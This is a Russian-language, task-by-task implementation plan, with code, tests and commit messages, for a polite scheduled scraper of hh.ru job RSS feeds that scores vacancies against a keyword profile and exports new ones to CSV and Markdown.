# HH.ru Autosearch Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Собрать сервис, который по расписанию ищет новые вакансии на hh.ru через публичную RSS-ленту, оценивает их по профилю и выгружает только новинки в CSV и Markdown.

**Architecture:** Семишаговый конвейер (discovery → dedup → prefilter → enrich → score → persist → emit). Дешёвые шаги отсева стоят до дорогого скачивания страниц. Состояние в SQLite, весь SQL изолирован в одном модуле-репозитории, вся работа с сетью — в одном HTTP-клиенте. Три протокола (`Scorer`, `Sink`, `Repository`) — точки расширения под LLM, Telegram и Postgres.

**Tech Stack:** Python 3.12, httpx, pydantic v2, PyYAML, typer, SQLite (stdlib), pytest + respx, ruff, mypy, uv, Docker.

**Спека:** `docs/superpowers/specs/2026-07-27-hh-autosearch-design.md`

## Global Constraints

- Python `>=3.12`. Все аннотации в современном стиле (`str | None`, `list[str]`).
- Рантайм-зависимости строго: `httpx`, `pydantic`, `pyyaml`, `typer`. Ничего больше добавлять нельзя.
- Сознательно **не** используем: `feedparser` (хватает `xml.etree`), HTML-парсер (JSON-LD достаётся регуляркой), `pandas` (хватает `csv`), `pymorphy` (хватает префикса основы).
- `pydantic-settings` появится только вместе с `TelegramSink` — в этом плане секретов нет, читать нечего.
- Все pydantic-модели конфига объявляются с `model_config = ConfigDict(extra="forbid")`. Опечатка в YAML обязана ронять процесс на старте.
- Вежливый HTTP — обязателен: честный `User-Agent` с контактом, `robots.txt` через `urllib.robotparser`, одно соединение за раз, пауза между запросами, соблюдение `429`/`Retry-After`. Устойчивый `403` останавливает прогон; **обходить блокировки запрещено**.
- Секретов в YAML нет. Только переменные окружения.
- Ориентир по размеру файла — ~150 строк. Исключение: `storage/repository.py` (~200), он намеренно собирает весь SQL в одном месте.
- Каждая задача заканчивается коммитом. Сообщения коммитов — на русском, в формате Conventional Commits.
- `mypy` запускается в строгом режиме и обязан проходить.

## Структура файлов

| Файл | Ответственность | Задача |
|---|---|---|
| `pyproject.toml` | Зависимости, ruff, mypy, pytest | 1 |
| `hh_search/config/models.py` | pydantic-схема трёх YAML | 1 |
| `hh_search/config/loader.py` | Чтение и валидация конфига | 1 |
| `hh_search/filtering/matching.py` | Нормализация текста, сопоставление сигналов | 2 |
| `hh_search/domain/models.py` | Доменные модели | 3 |
| `hh_search/sources/rss.py` | Разбор RSS; ВЫКЛЮЧЕН запретом robots.txt | 3 |
| `hh_search/sources/salary.py` | Разбор строки зарплаты | 3 |
| `hh_search/errors.py` | Типы исключений | 4 |
| `hh_search/sources/http.py` | Вежливый HTTP-клиент, матчер robots.txt | 4 |
| `hh_search/sources/vacancy_page.py` | Извлечение JSON-LD и зарплаты | 5 |
| `hh_search/sources/listing.py` | Шаг 1: URL листинга и разбор `ItemList` | 5 |
| `hh_search/storage/schema.sql` | DDL | 6 |
| `hh_search/storage/repository.py` | Весь SQL по `vacancy`, три очереди | 6 |
| `hh_search/storage/run_log.py` | Журнал прогонов и HTTP-кэш | 6 |
| `hh_search/storage/mappers.py` | `sqlite3.Row` → доменные модели | 6 |
| `hh_search/storage/quarantine.py` | Два вида порчи данных и их лечение | 6 |
| `hh_search/storage/migrations.py` | Догоняющая миграция базы | 6 |
| `hh_search/storage/time_utils.py` | Нормализация дат к aware UTC | 6 |
| `hh_search/filtering/prefilter.py` | Дешёвый отсев по заголовку | 7 |
| `hh_search/scoring/base.py` | Протокол `Scorer` | 8 |
| `hh_search/scoring/keyword.py` | Keyword-скоринг | 8 |
| `hh_search/sinks/base.py` | Протокол `Sink` | 9 |
| `hh_search/sinks/csv_sink.py` | CSV-отчёт | 9 |
| `hh_search/sinks/markdown_sink.py` | Markdown-отчёт | 9 |
| `hh_search/sinks/__init__.py` | Фабрика `build_sinks` | 9 |
| `hh_search/pipeline/__init__.py` | `run_once`: порядок семи шагов и журнал | 10 |
| `hh_search/pipeline/stats.py` | Счётчики прогона, статус, коды возврата | 10 |
| `hh_search/pipeline/discovery.py` | Шаги 1–3: листинги, дедуп, префильтр | 10 |
| `hh_search/pipeline/enrichment.py` | Шаги 4–6: страница, оценка, пересчёт | 10 |
| `hh_search/pipeline/reporting.py` | Шаг 7: отправка в приёмники | 10 |
| `hh_search/logging_setup.py` | Логи в stdout + файл с ротацией | 11 |
| `hh_search/scheduler.py` | Цикл режима `serve` | 11 |
| `hh_search/__main__.py` | CLI | 11 |
| `Dockerfile`, `compose.yaml` | Развёртывание | 12 |
| `.github/workflows/ci.yml` | CI | 13 |

---

### Task 1: Каркас проекта и конфигурация

**Files:**
- Create: `pyproject.toml`, `.gitignore`, `.env.example`
- Create: `hh_search/__init__.py`, `hh_search/config/__init__.py`, `hh_search/config/models.py`, `hh_search/config/loader.py`
- Test: `tests/__init__.py`, `tests/test_config.py`

**Interfaces:**
- Consumes: ничего
- Produces: `load_config(config_dir: Path) -> Config`; модели `Config` (поля `app`, `profile`, `queries`), `AppConfig` (`contact_email: str`, `user_agent: str`, `schedule: ScheduleConfig`, `http: HttpConfig`, `enrich: EnrichConfig`, `sinks: list[str]`, `paths: PathsConfig`), `ProfileConfig` (`weights: Weights`, `saturation: Saturation`, `penalty_per_signal: float`, `signals: Signals`, `negative: list[str]`, `report_threshold: float`), `QueriesConfig` (`defaults: QueryDefaults`, `queries: list[QuerySpec]`), `QuerySpec` (`text`, `cluster`, `weight`, `area: list[int] | None`, `experience: list[str] | None`, `employment: str | None`, `schedule: str | None`, `period: int | None`), `Weights` (`title`, `stack`, `responsibilities`, `domain`), `Saturation` (`stack: int`, `responsibilities: int`), `Signals` (`title_roles`, `title_tech`, `stack`, `responsibilities`, `domain` — все `list[str]`), `HttpConfig` (`delay_between_requests_sec`, `timeout_sec`, `max_retries`, `respect_robots`), `EnrichConfig` (`max_attempts: int`), `ScheduleConfig` (`interval_hours: int`), `PathsConfig` (`state: Path`, `reports: Path`, `logs: Path`)

- [ ] **Step 1: Создать `pyproject.toml`**

```toml
[project]
name = "hh-search"
version = "0.1.0"
requires-python = ">=3.12"
dependencies = [
    "httpx>=0.27",
    "pydantic>=2.7",
    "pyyaml>=6.0",
    "typer>=0.12",
]

[project.optional-dependencies]
dev = ["pytest>=8.0", "respx>=0.21", "ruff>=0.5", "mypy>=1.10", "types-PyYAML"]

[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[tool.hatch.build.targets.wheel]
packages = ["hh_search"]

[tool.pytest.ini_options]
markers = ["network: ходит в живой hh.ru; в CI пропускается"]
addopts = "-m 'not network'"
testpaths = ["tests"]

[tool.ruff]
line-length = 100
target-version = "py312"

[tool.ruff.lint]
# BLE и SLF включены намеренно: широкий except и доступ к приватным атрибутам
# в этом проекте допустимы только там, где это осознанно помечено noqa.
select = ["E", "F", "I", "UP", "B", "BLE", "SLF"]

[tool.mypy]
python_version = "3.12"
strict = true
plugins = ["pydantic.mypy"]
```

- [ ] **Step 2: Создать `.gitignore` и `.env.example`**

`.gitignore`:
```
__pycache__/
*.py[cod]
.venv/
.pytest_cache/
.mypy_cache/
.ruff_cache/
dist/
data/
.env
```

`.env.example`:
```
# Понадобится начиная с TelegramSink, в первой версии не используется.
# HH_TELEGRAM_TOKEN=
# HH_TELEGRAM_CHAT_ID=
```

- [ ] **Step 3: Написать падающий тест конфигурации**

Создать `tests/test_config.py`:

```python
from pathlib import Path

import pytest
from pydantic import ValidationError

from hh_search.config.loader import load_config

APP_YAML = """
contact_email: "me@example.com"
user_agent: "hh-search/0.1 (personal job search; {contact_email})"
schedule:
  interval_hours: 4
http:
  delay_between_requests_sec: 1.0
  timeout_sec: 20
  max_retries: 3
  respect_robots: true
enrich:
  max_attempts: 3
sinks: [csv, markdown]
paths:
  state: /data/state/hh.db
  reports: /data/reports
  logs: /data/logs
"""

PROFILE_YAML = """
weights: {title: 0.40, stack: 0.30, responsibilities: 0.20, domain: 0.10}
saturation: {stack: 5, responsibilities: 3}
penalty_per_signal: 15
signals:
  title_roles: [team lead]
  title_tech: [backend]
  stack: [yocto]
  responsibilities: [архитектур]
  domain: [телеком]
negative: [junior]
report_threshold: 60
"""

QUERIES_YAML = """
defaults:
  experience: [between3And6, moreThan6]
  employment: full
queries:
  - text: "Yocto"
    cluster: embedded
    weight: 9
    area: [66]
"""


def write_config(tmp_path: Path, **overrides: str) -> Path:
    files = {"app.yaml": APP_YAML, "profile.yaml": PROFILE_YAML, "queries.yaml": QUERIES_YAML}
    files.update(overrides)
    for name, body in files.items():
        (tmp_path / name).write_text(body, encoding="utf-8")
    return tmp_path


def test_loads_all_three_files(tmp_path: Path) -> None:
    cfg = load_config(write_config(tmp_path))
    assert cfg.app.schedule.interval_hours == 4
    assert cfg.profile.weights.stack == 0.30
    assert cfg.queries.queries[0].text == "Yocto"
    assert cfg.queries.queries[0].area == [66]


def test_user_agent_gets_contact_email_substituted(tmp_path: Path) -> None:
    cfg = load_config(write_config(tmp_path))
    assert cfg.app.user_agent == "hh-search/0.1 (personal job search; me@example.com)"


def test_unknown_key_is_rejected(tmp_path: Path) -> None:
    broken = PROFILE_YAML + "\nreport_treshold: 70\n"  # опечатка в слове threshold
    with pytest.raises(ValidationError):
        load_config(write_config(tmp_path, **{"profile.yaml": broken}))


def test_weights_must_sum_to_one(tmp_path: Path) -> None:
    broken = PROFILE_YAML.replace("title: 0.40", "title: 0.90")
    with pytest.raises(ValidationError, match="sum to 1.0"):
        load_config(write_config(tmp_path, **{"profile.yaml": broken}))


def test_query_inherits_defaults(tmp_path: Path) -> None:
    cfg = load_config(write_config(tmp_path))
    query = cfg.queries.queries[0]
    assert query.experience == ["between3And6", "moreThan6"]
    assert query.employment == "full"
```

- [ ] **Step 4: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_config.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search'`

- [ ] **Step 5: Реализовать `hh_search/config/models.py`**

```python
from pathlib import Path

from pydantic import BaseModel, ConfigDict, model_validator


class Base(BaseModel):
    model_config = ConfigDict(extra="forbid")


class ScheduleConfig(Base):
    interval_hours: int = 4


class HttpConfig(Base):
    delay_between_requests_sec: float = 1.0
    timeout_sec: float = 20.0
    max_retries: int = 3
    respect_robots: bool = True


class EnrichConfig(Base):
    max_attempts: int = 3


class PathsConfig(Base):
    state: Path
    reports: Path
    logs: Path


class AppConfig(Base):
    contact_email: str
    user_agent: str
    schedule: ScheduleConfig = ScheduleConfig()
    http: HttpConfig = HttpConfig()
    enrich: EnrichConfig = EnrichConfig()
    sinks: list[str]
    paths: PathsConfig

    @model_validator(mode="after")
    def substitute_contact_email(self) -> "AppConfig":
        self.user_agent = self.user_agent.format(contact_email=self.contact_email)
        return self


class Weights(Base):
    title: float
    stack: float
    responsibilities: float
    domain: float

    @model_validator(mode="after")
    def check_sum(self) -> "Weights":
        total = self.title + self.stack + self.responsibilities + self.domain
        if abs(total - 1.0) > 1e-6:
            raise ValueError(f"weights must sum to 1.0, got {total}")
        return self


class Saturation(Base):
    stack: int
    responsibilities: int


class Signals(Base):
    title_roles: list[str]
    title_tech: list[str]
    stack: list[str]
    responsibilities: list[str]
    domain: list[str]


class ProfileConfig(Base):
    weights: Weights
    saturation: Saturation
    penalty_per_signal: float
    signals: Signals
    negative: list[str]
    report_threshold: float = 60.0


class QueryDefaults(Base):
    experience: list[str] | None = None
    employment: str | None = None
    schedule: str | None = None
    period: int | None = None


class QuerySpec(Base):
    text: str
    cluster: str
    weight: int = 5
    area: list[int] | None = None
    experience: list[str] | None = None
    employment: str | None = None
    schedule: str | None = None
    period: int | None = None


class QueriesConfig(Base):
    defaults: QueryDefaults = QueryDefaults()
    queries: list[QuerySpec]

    @model_validator(mode="after")
    def apply_defaults(self) -> "QueriesConfig":
        for query in self.queries:
            for field in ("experience", "employment", "schedule", "period"):
                if getattr(query, field) is None:
                    setattr(query, field, getattr(self.defaults, field))
        return self


class Config(Base):
    app: AppConfig
    profile: ProfileConfig
    queries: QueriesConfig
```

- [ ] **Step 6: Реализовать `hh_search/config/loader.py`**

```python
from pathlib import Path
from typing import Any

import yaml

from hh_search.config.models import Config


def _read_yaml(path: Path) -> dict[str, Any]:
    if not path.exists():
        raise FileNotFoundError(f"конфиг не найден: {path}")
    with path.open(encoding="utf-8") as handle:
        data = yaml.safe_load(handle)
    if not isinstance(data, dict):
        raise ValueError(f"ожидался словарь в {path}, получено {type(data).__name__}")
    return data


def load_config(config_dir: Path) -> Config:
    """Читает три YAML из каталога и валидирует их. Бросает на первой же ошибке."""
    return Config.model_validate(
        {
            "app": _read_yaml(config_dir / "app.yaml"),
            "profile": _read_yaml(config_dir / "profile.yaml"),
            "queries": _read_yaml(config_dir / "queries.yaml"),
        }
    )
```

Создать пустые `hh_search/__init__.py`, `hh_search/config/__init__.py`, `tests/__init__.py`.

- [ ] **Step 7: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_config.py -v && uv run mypy hh_search && uv run ruff check .`
Expected: 5 passed, mypy и ruff без замечаний

- [ ] **Step 8: Коммит**

```bash
git add pyproject.toml .gitignore .env.example hh_search tests
git commit -m "feat: каркас проекта и загрузка конфигурации

Три YAML-файла (app/profile/queries) с валидацией через pydantic.
extra=forbid, чтобы опечатка роняла процесс на старте, а не молча
меняла поведение. Веса скоринга проверяются на сумму 1.0."
```

---

### Task 2: Нормализация и сопоставление сигналов

Это модуль, где закопаны главные грабли (спека §6.1). Он чистый, без ввода-вывода, и тестируется плотнее всего остального.

**Files:**
- Create: `hh_search/filtering/__init__.py`, `hh_search/filtering/matching.py`
- Test: `tests/test_matching.py`

**Interfaces:**
- Consumes: ничего
- Produces: `normalize(text: str) -> str`; `class SignalMatcher` с конструктором `SignalMatcher(patterns: Sequence[str])`, методами `find(text: str) -> list[str]` (возвращает **исходные** строки паттернов в порядке их объявления) и `has_any(text: str) -> bool`

**Правило сопоставления** (задаётся один раз здесь и дальше нигде не переизобретается),
решение принимается **для каждого слова отдельно** и по исходному написанию, до нормализации:

- слово содержит кириллицу **и не содержит цифр** → матчится **по началу слова**
  (`архитектур` ловит `архитектуры`). Цифры исключены, иначе код `1С` превратился бы
  в неограниченный префикс и ловил `1Cats`;
- иначе → матчится **как целое слово** (`lead` не ловится в `leadership`).

Границы слова заданы lookaround'ами, а не `\b`: обычная граница ломается на `C++` и `C#`.
Правая граница `(?![\w+#]|\.\w)` допускает точку, если за ней не идёт буква — иначе
терялось бы любое ключевое слово в конце предложения.

**Следствие для конфига:** кириллические сигналы в `profile.yaml` пишутся **основами**
(`архитектур`, `проектирован`), а не полными словоформами. Литеральный префикс не поймает
`информационной`, если задать `информационная` — расхождение приходится на конец паттерна,
и хвост `\w*` его не компенсирует.

- [ ] **Step 1: Написать падающий тест**

Создать `tests/test_matching.py`:

```python
from hh_search.filtering.matching import SignalMatcher, normalize


def test_normalize_unifies_cyrillic_and_latin_lookalikes() -> None:
    assert normalize("1С") == normalize("1C")  # первая С кириллическая


def test_normalize_collapses_yo_and_case() -> None:
    assert normalize("Стажёр") == normalize("стажер")


def test_latin_pattern_matches_whole_word_only() -> None:
    matcher = SignalMatcher(["lead"])
    assert matcher.find("Ищем Team Lead в команду") == ["lead"]
    assert matcher.find("Strong leadership skills") == []


def test_cyrillic_pattern_matches_by_stem() -> None:
    matcher = SignalMatcher(["архитектур"])
    assert matcher.find("Проектирование архитектуры сервисов") == ["архитектур"]


def test_cyrillic_stem_must_start_a_word() -> None:
    matcher = SignalMatcher(["строй"])
    assert matcher.find("настройка сервера") == []


def test_plus_signs_do_not_break_boundaries() -> None:
    matcher = SignalMatcher(["c++"])
    assert matcher.find("Требуется опыт C++ и Python") == ["c++"]


def test_bare_c_does_not_match_cpp() -> None:
    matcher = SignalMatcher(["c#"])
    assert matcher.find("Требуется опыт C++") == []


def test_stop_word_matches_cyrillic_spelling_of_1c() -> None:
    matcher = SignalMatcher(["1c"])
    assert matcher.find("Разработчик 1С") == ["1c"]


def test_multiword_pattern_tolerates_extra_whitespace() -> None:
    matcher = SignalMatcher(["team lead"])
    assert matcher.find("Ищем Team  Lead") == ["team lead"]


def test_find_returns_original_spelling_without_duplicates() -> None:
    matcher = SignalMatcher(["Yocto", "BSP"])
    assert matcher.find("Yocto, BSP и снова yocto") == ["Yocto", "BSP"]


def test_has_any_is_true_when_something_matched() -> None:
    matcher = SignalMatcher(["junior"])
    assert matcher.has_any("Junior developer") is True
    assert matcher.has_any("Senior developer") is False
```

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_matching.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.filtering'`

- [ ] **Step 3: Реализовать `hh_search/filtering/matching.py`**

```python
import re
from collections.abc import Sequence

# Кириллические буквы, неотличимые на вид от латинских. Отображение применяется
# и к тексту, и к паттернам, поэтому русские слова продолжают совпадать друг с
# другом, а «1С» и «1C» сходятся в одну форму.
_CONFUSABLES = {
    "ё": "e", "е": "e", "а": "a", "в": "b", "с": "c", "к": "k",
    "м": "m", "н": "h", "о": "o", "р": "p", "т": "t", "у": "y", "х": "x",
}
_TRANSLATION = str.maketrans(_CONFUSABLES)

_CYRILLIC = re.compile(r"[а-яё]", re.IGNORECASE)

# Границы слова, устойчивые к «+», «#» и «.» — обычный \b на них не работает,
# потому что после «+» нет перехода между словесным и несловесным символом.
# Точка справа разрешена, если за ней не идёт буква: иначе терялось бы любое
# ключевое слово в конце предложения, а «node» всё ещё не ловится в «node.js».
_LEFT_BOUNDARY = r"(?<![\w+#.])"
_RIGHT_BOUNDARY = r"(?![\w+#]|\.\w)"


def normalize(text: str) -> str:
    """Нижний регистр плюс схлопывание визуально одинаковых символов."""
    return text.lower().translate(_TRANSLATION)


def _is_stem_word(word: str) -> bool:
    """Кириллическое слово без цифр склоняется, поэтому матчится по основе.

    Решение принимается по исходному написанию слова, до нормализации.
    Цифры исключены из правила, чтобы короткие коды вроде «1С» не превращались
    в неограниченный префиксный матч (1С не должно ловить 1Cats).
    """
    return bool(_CYRILLIC.search(word)) and not any(ch.isdigit() for ch in word)


def _compile(pattern: str) -> re.Pattern[str]:
    raw_words = pattern.split()
    norm_words = normalize(pattern).split()
    parts = [
        re.escape(norm_word) + (r"\w*" if _is_stem_word(raw_word) else "")
        for raw_word, norm_word in zip(raw_words, norm_words, strict=True)
    ]
    body = r"\s+".join(parts)
    # Хвост из \w* у последнего слова уже сам ограничивает совпадение справа;
    # добавлять _RIGHT_BOUNDARY нужно, только если последнее слово не по основе.
    tail = "" if raw_words and _is_stem_word(raw_words[-1]) else _RIGHT_BOUNDARY
    return re.compile(_LEFT_BOUNDARY + body + tail)


class SignalMatcher:
    """Ищет в тексте вхождения списка сигналов, возвращая исходные написания."""

    def __init__(self, patterns: Sequence[str]) -> None:
        self._patterns = list(patterns)
        self._compiled = [_compile(pattern) for pattern in self._patterns]

    def find(self, text: str) -> list[str]:
        haystack = normalize(text)
        return [
            original
            for original, regex in zip(self._patterns, self._compiled, strict=True)
            if regex.search(haystack)
        ]

    def has_any(self, text: str) -> bool:
        haystack = normalize(text)
        return any(regex.search(haystack) for regex in self._compiled)
```

Создать пустой `hh_search/filtering/__init__.py`.

- [ ] **Step 4: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_matching.py -v && uv run mypy hh_search`
Expected: 15 passed (11 из брифа плюс 4 регрессионных на границы, пер-словный стемминг и правило цифра+кириллица)

- [ ] **Step 5: Коммит**

```bash
git add hh_search/filtering tests/test_matching.py
git commit -m "feat: нормализация текста и сопоставление сигналов

Схлопывание визуально одинаковых кириллических и латинских букв —
без него стоп-слово 1C молча не ловит написание 1С. Кириллические
паттерны матчатся по основе слова, латинские — как целое слово,
поэтому lead не срабатывает внутри leadership. Границы слова
сделаны на lookaround, обычный \\b ломается на C++ и C#."
```

> **Известные ограничения, вынести в README на Task 13:**
> 1. Короткие латинские паттерны из «похожих» букв дают ложные срабатывания на русских
>    словах: `c` совпадает с предлогом «с», `co` — с «со». Пишите `c++`, `c/c++` или `си`.
> 2. Кириллические сигналы задаются **основами** (`архитектур`), не словоформами.
> 3. Многословные паттерны терпят лишние пробелы, но не дефис: `team lead` не поймает
>    `Team-Lead`.

---

### Task 3: Доменные модели и разбор RSS

**Files:**
- Create: `hh_search/domain/__init__.py`, `hh_search/domain/models.py`, `hh_search/sources/__init__.py`, `hh_search/sources/rss.py`
- Create: `tests/fixtures/rss_yocto.xml`
- Test: `tests/test_rss.py`

**Interfaces:**
- Consumes: `QuerySpec` из Task 1
- Produces: модели `Salary` (`raw: str | None`, `amount_from: int | None`, `amount_to: int | None`, `currency: str | None`), `DiscoveredVacancy` (`id: str`, `url: str`, `title: str`, `company: str | None`, `area: str | None`, `salary: Salary`, `published_at: datetime`, `found_by_query: str`), `VacancyDetails` (`description: str`, `valid_through: datetime | None`, `location: str | None`), `ScoreBreakdown` (`title: float`, `stack: float`, `responsibilities: float`, `domain: float`, `penalty: float`, `total: float`, `matched: dict[str, list[str]]`), `ScoredVacancy` (`discovered: DiscoveredVacancy`, `details: VacancyDetails`, `score: ScoreBreakdown`, `cluster: str`); функции `build_rss_url(query: QuerySpec) -> str`, `parse_salary(raw: str) -> Salary`, `parse_feed(xml_text: str, query_text: str) -> list[DiscoveredVacancy]`

- [ ] **Step 1: Сохранить фикстуру живой RSS-ленты**

Эти URL проверены 2026-07-27 и на тот момент отдавали 200.

```bash
mkdir -p tests/fixtures
curl -s -H "User-Agent: hh-search/0.1 (fixture capture)" \
  "https://hh.ru/search/vacancy/rss?text=Yocto&order_by=publication_time" \
  -o tests/fixtures/rss_yocto.xml
grep -c '<item>' tests/fixtures/rss_yocto.xml   # ожидается 20
```

Если hh недоступен — соберите фикстуру вручную по образцу структуры:
`<rss version="2.0"><channel>` с элементами `<item>`, каждый содержит `<pubDate>`,
`<title>`, `<link>https://hh.ru/vacancy/135586311</link>`, `<guid>` и `<description>`
с CDATA вида
`<p>Вакансия компании: НАЗВАНИЕ</p> <p>Создана: 27.07.2026</p> <p>Регион: Москва</p> <p>Предполагаемый уровень месячного дохода: не указан</p>`.

- [ ] **Step 2: Написать падающий тест**

Создать `tests/test_rss.py`:

```python
from datetime import datetime
from pathlib import Path

import pytest

from hh_search.config.models import QuerySpec
from hh_search.sources.rss import build_rss_url, parse_feed, parse_salary

FIXTURE = Path(__file__).parent / "fixtures" / "rss_yocto.xml"


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("не указан", (None, None, None)),
        ("от 200 000 руб.", (200000, None, "руб.")),
        ("от 100 000 до 150 000 руб.", (100000, 150000, "руб.")),
        ("до 300 000 руб.", (None, 300000, "руб.")),
    ],
)
def test_parse_salary(raw: str, expected: tuple[int | None, int | None, str | None]) -> None:
    salary = parse_salary(raw)
    assert (salary.amount_from, salary.amount_to, salary.currency) == expected


def test_parse_salary_handles_non_breaking_spaces() -> None:
    assert parse_salary("от 200 000 руб.").amount_from == 200000


def test_parse_feed_extracts_every_item() -> None:
    vacancies = parse_feed(FIXTURE.read_text(encoding="utf-8"), "Yocto")
    assert len(vacancies) == 20
    assert all(vacancy.id.isdigit() for vacancy in vacancies)
    assert all(vacancy.found_by_query == "Yocto" for vacancy in vacancies)


def test_parse_feed_extracts_fields_of_first_item() -> None:
    first = parse_feed(FIXTURE.read_text(encoding="utf-8"), "Yocto")[0]
    assert first.url == f"https://hh.ru/vacancy/{first.id}"
    assert first.title
    assert first.company
    assert first.area
    assert isinstance(first.published_at, datetime)


def test_build_rss_url_includes_filters_and_date_ordering() -> None:
    url = build_rss_url(
        QuerySpec(
            text="Backend Team Lead",
            cluster="backend",
            area=[66],
            experience=["between3And6", "moreThan6"],
            employment="full",
        )
    )
    assert url.startswith("https://hh.ru/search/vacancy/rss?")
    assert "text=Backend+Team+Lead" in url
    assert "area=66" in url
    assert "experience=between3And6" in url
    assert "experience=moreThan6" in url
    assert "employment=full" in url
    assert "order_by=publication_time" in url


def test_build_rss_url_omits_unset_filters() -> None:
    url = build_rss_url(QuerySpec(text="Yocto", cluster="embedded"))
    assert "area=" not in url
    assert "schedule=" not in url
```

- [ ] **Step 3: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_rss.py -v`
Expected: FAIL с `ModuleNotFoundError: No module named 'hh_search.domain'`

- [ ] **Step 4: Реализовать `hh_search/domain/models.py`**

```python
from datetime import datetime

from pydantic import BaseModel


class Salary(BaseModel):
    raw: str | None = None
    amount_from: int | None = None
    amount_to: int | None = None
    currency: str | None = None


class DiscoveredVacancy(BaseModel):
    id: str
    url: str
    title: str
    company: str | None = None
    area: str | None = None
    salary: Salary = Salary()
    published_at: datetime
    found_by_query: str


class VacancyDetails(BaseModel):
    description: str
    valid_through: datetime | None = None
    location: str | None = None


class ScoreBreakdown(BaseModel):
    title: float
    stack: float
    responsibilities: float
    domain: float
    penalty: float
    total: float
    matched: dict[str, list[str]] = {}


class ScoredVacancy(BaseModel):
    discovered: DiscoveredVacancy
    details: VacancyDetails
    score: ScoreBreakdown
    cluster: str
```

- [ ] **Step 5: Реализовать `hh_search/sources/rss.py`**

```python
import re
from datetime import datetime
from urllib.parse import urlencode
from xml.etree import ElementTree

from hh_search.config.models import QuerySpec
from hh_search.domain.models import DiscoveredVacancy, Salary

RSS_BASE_URL = "https://hh.ru/search/vacancy/rss"

_ID_RE = re.compile(r"/vacancy/(\d+)")
_COMPANY_RE = re.compile(r"Вакансия компании:\s*([^<]+)")
_REGION_RE = re.compile(r"Регион:\s*([^<]+)")
_INCOME_RE = re.compile(r"дохода:\s*([^<]+)")
_FROM_RE = re.compile(r"от\s*([\d\s ]+)")
_TO_RE = re.compile(r"до\s*([\d\s ]+)")
_CURRENCY_RE = re.compile(r"([A-Za-zА-Яа-я.]+)\s*$")
_DIGITS_ONLY = re.compile(r"[\s ]")


def build_rss_url(query: QuerySpec) -> str:
    params: list[tuple[str, str]] = [("text", query.text), ("order_by", "publication_time")]
    for area in query.area or []:
        params.append(("area", str(area)))
    for experience in query.experience or []:
        params.append(("experience", experience))
    if query.employment:
        params.append(("employment", query.employment))
    if query.schedule:
        params.append(("schedule", query.schedule))
    if query.period is not None:
        params.append(("period", str(query.period)))
    return f"{RSS_BASE_URL}?{urlencode(params)}"


def parse_salary(raw: str) -> Salary:
    text = (raw or "").strip()
    if not text or "не указан" in text:
        return Salary(raw=text or None)

    def to_int(match: re.Match[str] | None) -> int | None:
        if match is None:
            return None
        digits = _DIGITS_ONLY.sub("", match.group(1))
        return int(digits) if digits.isdigit() else None

    currency_match = _CURRENCY_RE.search(text)
    return Salary(
        raw=text,
        amount_from=to_int(_FROM_RE.search(text)),
        amount_to=to_int(_TO_RE.search(text)),
        currency=currency_match.group(1) if currency_match else None,
    )


def _first_group(regex: re.Pattern[str], text: str) -> str | None:
    match = regex.search(text)
    return match.group(1).strip() if match else None


def parse_feed(xml_text: str, query_text: str) -> list[DiscoveredVacancy]:
    root = ElementTree.fromstring(xml_text)
    vacancies: list[DiscoveredVacancy] = []
    for item in root.iterfind("./channel/item"):
        link = (item.findtext("link") or "").strip()
        id_match = _ID_RE.search(link)
        if not id_match:
            continue
        description = item.findtext("description") or ""
        income = _first_group(_INCOME_RE, description) or ""
        vacancies.append(
            DiscoveredVacancy(
                id=id_match.group(1),
                url=f"https://hh.ru/vacancy/{id_match.group(1)}",
                title=(item.findtext("title") or "").strip(),
                company=_first_group(_COMPANY_RE, description),
                area=_first_group(_REGION_RE, description),
                salary=parse_salary(income),
                published_at=datetime.fromisoformat((item.findtext("pubDate") or "").strip()),
                found_by_query=query_text,
            )
        )
    return vacancies
```

Создать пустые `hh_search/domain/__init__.py`, `hh_search/sources/__init__.py`.

>**Итоговая реализация отличается от кода выше.** Разбор зарплаты пережил пять
> раундов исправлений: `parse_salary` переписан на ОДНО якорное совпадение от
> начала строки (`от A [до B] ВАЛЮТА`), а `_FROM_RE`/`_TO_RE`/`_CURRENCY_RE`
> удалены. Причина: любой поиск кусков по всей строке подхватывал служебные
> слова («до вычета налогов», «опыт от 3 лет») вместо валюты. Актуальная версия —
> в `hh_search/sources/rss.py`, обоснование каждого раунда — в отчёте задачи.
> Тестов в файле по итогу 54, а не 9.

- [ ] **Step 6: Запустить тесты и убедиться, что они проходят**

Run: `uv run pytest tests/test_rss.py -v && uv run mypy hh_search`
Expected: 9 passed на исходном коде брифа

- [ ] **Step 7: Коммит**

```bash
git add hh_search/domain hh_search/sources tests/test_rss.py tests/fixtures
git commit -m "feat: доменные модели и разбор RSS-ленты hh.ru

Сборка URL со всеми фильтрами и обязательным order_by=publication_time
(без него окно из 20 вакансий перестаёт быть окном свежих). Разбор
ленты на xml.etree, зарплата вытаскивается из CDATA-описания с учётом
неразрывных пробелов. Тесты идут на зафиксированной живой ленте."
```

---

### Task 4: Вежливый HTTP-клиент

**Files:**
- Create: `hh_search/errors.py`, `hh_search/sources/http.py`
- Test: `tests/test_http.py`

**Interfaces:**
- Consumes: `HttpConfig` из Task 1
- Produces: исключения `AccessForbidden`, `FetchFailed`, `RobotsDisallowed` (все от `HhSearchError`); `class PoliteClient(config: HttpConfig, user_agent: str, sleep: Callable[[float], None] = time.sleep, transport: httpx.BaseTransport | None = None)` с методами `get(url: str, conditional: dict[str, str] | None = None) -> httpx.Response` и `close() -> None`; поддержка контекстного менеджера

Поведение `get`:
- перед запросом спит столько, чтобы с прошлого запроса прошло не менее `delay_between_requests_sec`;
- при `respect_robots` один раз тянет `https://hh.ru/robots.txt` и отклоняет запрещённые пути через `RobotsDisallowed`;
- `403` → `AccessForbidden` немедленно, без повторов;
- `429` → ждёт `Retry-After` (если заголовка нет — экспоненциальная пауза), до `max_retries` попыток;
